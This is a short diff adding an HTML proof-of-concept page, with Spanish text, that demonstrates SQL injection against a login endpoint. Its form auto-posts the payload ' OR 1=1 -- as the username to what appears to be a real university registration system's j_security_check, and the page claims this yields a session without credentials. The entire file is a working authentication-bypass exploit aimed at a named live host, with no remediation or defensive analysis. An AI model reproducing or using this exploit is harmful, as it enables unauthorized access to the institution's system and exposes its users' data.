@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>SQL Injection PoC - SIIGAA</title></head>
+<body>
+<h1>SQL Injection Proof of Concept</h1>
+<p>Este formulario demuestra SQL Injection en j_security_check.</p>
+<form action="https://registro.uns.edu.pe/udemsi/j_security_check" method="POST">
+  <input type="hidden" name="j_username" value="' OR 1=1 --">
+  <input type="hidden" name="j_password" value="cualquier_texto">
+  <input type="submit" value="Enviar">
+</form>
+<p>Al enviar el formulario, se crea una sesion sin credenciales reales.</p>
+</body>
+</html>
